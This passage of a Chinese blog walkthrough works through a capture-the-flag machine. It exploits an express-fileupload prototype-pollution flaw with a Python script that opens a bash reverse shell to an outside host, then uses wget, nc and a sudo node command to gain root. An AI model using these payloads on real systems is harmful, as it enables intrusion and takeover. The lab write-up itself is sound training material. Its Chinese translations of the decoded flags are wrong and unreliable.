+<h3 id="3-搜索大法好"><a href="#3-搜索大法好" class="headerlink" title="3.搜索大法好"></a>3.搜索大法好</h3><p>express-fileupload漏洞</p>
+<p>百度：<a target="_blank" rel="noopener" href="https://www.sohu.com/a/412389503_100002744">流行的Node.js库中存在原型污染漏洞，可致Web应用程序遭受DoS和远程Shell攻击_Posix (sohu.com)</a></p>
+<p>Google：<a target="_blank" rel="noopener" href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a></p>
+<p><strong>发现EXP</strong></p>
+<blockquote>
+<p>import requests</p>
+<p>cmd &#x3D; ‘bash -c “bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;p6.is&#x2F;8888 0&gt;&amp;1”‘</p>
+<p>#pollute</p>
+<p>requests.post(‘<a href="http://p6.is:7777&#39;">http://p6.is:7777&#39;</a>, files &#x3D; {‘<strong>proto</strong>.outputFunctionName’: (<br>   None, f”x;console.log(1);process.mainModule.require(‘child_process’).exec(‘{cmd}’);x”)})</p>
+<p>#execute command</p>
+<p>requests.get(‘<a href="http://p6.is:7777&#39;">http://p6.is:7777&#39;</a>)</p>
+</blockquote>
+<p>kali:</p>
+<p>根据ip修改EXP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi exp.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101833596.png" alt="image-20211104101833596"></p>
+<blockquote>
+<p>import requests</p>
+<p>cmd &#x3D; ‘bash -c “bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.4&#x2F;4444 0&gt;&amp;1”‘</p>
+<p>#pollute</p>
+<p>requests.post(‘<a href="http://127.0.0.1:8080&#39;">http://127.0.0.1:8080&#39;</a>, files &#x3D; {‘<strong>proto</strong>.outputFunctionName’: (<br>   None, f”x;console.log(1);process.mainModule.require(‘child_process’).exec(‘{cmd}’);x”)})</p>
+<p>#execute command</p>
+<p>requests.get(‘<a href="http://127.0.0.1:8080&#39;">http://127.0.0.1:8080&#39;</a>)</p>
+</blockquote>
+<p>已将exp写在本地，需将该exp.py上传至目标端</p>
+<p>kali：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104102630662.png" alt="image-20211104102630662"></p>
+<p>shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp   #易向里写文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/exp.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104102839677.png" alt="image-20211104102839677"></p>
+<p>exp.py上传成功</p>
+<p>kali:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103155596.png" alt="image-20211104103155596"></p>
+<p>shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103241230.png" alt="image-20211104103241230"></p>
+<p><strong>成功建立反弹shell</strong>，当前用户为imera</p>
+<p>结合之前的信息收集，得知imera用户主目录下有<strong>user.txt</strong>文件，进行查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103811115.png" alt="image-20211104103811115"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103921395.png" alt="image-20211104103921395"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-最终提权"><a href="#4-最终提权" class="headerlink" title="4.最终提权"></a>4.最终提权</h3><p>尝试进入root目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104228705.png" alt="image-20211104104228705"></p>
+<p>失败，在此需要提权</p>
+<p>尝试有没有sudo提权漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104353472.png" alt="image-20211104104353472"></p>
+<p>发现用户imera在没有root用户密码的权限下，只执行sudo，<strong>可以执行node和npm命令</strong></p>
+<p>搜集发现了一段代码（调用node执行生成一个子进程，子进程运行&#x2F;bin&#x2F;bash）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;   </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104738393.png" alt="image-20211104104738393"></p>
+<p>发现已经<strong>成功提权</strong>为root用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104834470.png" alt="image-20211104104834470"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>CyberChef:</p>
+<blockquote>
+<p>user.txt</p>
+<p>byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</p>
+<p>–&gt;o chronos pernaei file mou.</p>
+<p>译–&gt;我们签署了谅解备忘录。</p>
+</blockquote>
+<blockquote>
+<p>root.txt</p>
+<p>YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</p>
+<p>–&gt;apopse siopi mazeuoume oneira.</p>
+<p>译–&gt;我很高兴见到你。</p>
+</blockquote>
+</div></article></div></main><footer><div class="paginator"><a href="/2022/04/12/week2/" class="prev">PREV</a><a href="/2022/04/12/week4/" class="next">NEXT</a></div><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
